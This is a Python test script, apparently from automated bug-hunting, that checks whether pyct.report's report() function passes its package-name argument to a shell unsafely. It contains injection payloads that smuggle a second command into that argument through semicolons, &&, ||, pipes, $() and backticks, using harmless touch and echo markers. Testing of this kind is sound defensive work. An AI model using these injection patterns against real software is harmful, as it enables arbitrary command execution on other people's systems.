#!/usr/bin/env python3
"""Test for actual command injection in pyct.report"""

import sys
sys.path.insert(0, '/root/hypothesis-llm/envs/pyct_env/lib/python3.13/site-packages')

import io
import os
import tempfile
from pyct.report import report

print("Testing for Command Injection Vulnerability")
print("=" * 60)

# Create a temporary file to check if commands are executed
temp_file = tempfile.mktemp(suffix="_injection_test")
print(f"Temp file for testing: {temp_file}")
print()

# Test various injection payloads
# Since the code uses shell=True in subprocess calls, there's potential for injection
injection_tests = [
    ('python; touch ' + temp_file, "Semicolon command chaining"),
    ('python && touch ' + temp_file, "AND command chaining"),
    ('python || touch ' + temp_file, "OR command chaining"),  
    ('python | touch ' + temp_file, "Pipe command"),
    ('python$(touch ' + temp_file + ')', "Command substitution $()"),
    ('python`touch ' + temp_file + '`', "Command substitution backticks"),
    ('conda; touch ' + temp_file, "With accepted command 'conda'"),
]

for payload, description in injection_tests:
    print(f"Testing: {description}")
    print(f"  Payload: '{payload}'")
    
    # Remove file if it exists
    if os.path.exists(temp_file):
        os.remove(temp_file)
    
    captured_output = io.StringIO()
    sys.stdout = captured_output
    try:
        report(payload)
    finally:
        sys.stdout = sys.__stdout__
    
    output = captured_output.getvalue()
    
    # Check if the file was created (indicates command injection)
    if os.path.exists(temp_file):
        print(f"  ✗ COMMAND INJECTION SUCCESSFUL! File was created!")
        print(f"  Output: {output.strip()}")
        os.remove(temp_file)  # Clean up
        break
    else:
        print(f"  ✓ No injection (file not created)")

print()
print("Note: The code only runs shell commands for 'python' and 'conda' in accepted_commands")
print("Let's check if these specific commands are vulnerable...")
print()

# The vulnerability would only trigger if the package name is in accepted_commands
# but the check happens AFTER import fails, so let's force that path
print("Since 'python' and 'conda' are in accepted_commands, let's test those specifically...")

# This is tricky because 'python' might actually import as a module
# Let's test with a payload that would definitely fail import but is in accepted_commands

# Actually, looking at the code more carefully:
# The shell command is only executed if:
# 1. Import fails with ImportError/ModuleNotFoundError
# 2. package is in accepted_commands ('python', 'conda')
# 3. Then it runs: 'command -v {package}' with shell=True

print("Testing command injection in 'command -v' call...")
test_payload = "python; echo INJECTED > /tmp/pyct_injection_test"

captured_output = io.StringIO()
sys.stdout = captured_output
try:
    report(test_payload)
finally:
    sys.stdout = sys.__stdout__

output = captured_output.getvalue()
print(f"Payload: '{test_payload}'")
print(f"Output: {output.strip()}")

if os.path.exists("/tmp/pyct_injection_test"):
    print("✗ COMMAND INJECTION CONFIRMED! File /tmp/pyct_injection_test was created")
    with open("/tmp/pyct_injection_test", "r") as f:
        content = f.read()
    print(f"  File contents: {content}")
    os.remove("/tmp/pyct_injection_test")
else:
    print("✓ No command injection detected")

print()
print("The issue is that shell=True is used with user input in subprocess.check_output()")
print("But the injection only works if the package name starts with 'python' or 'conda'")
print("since the code checks: if package in accepted_commands")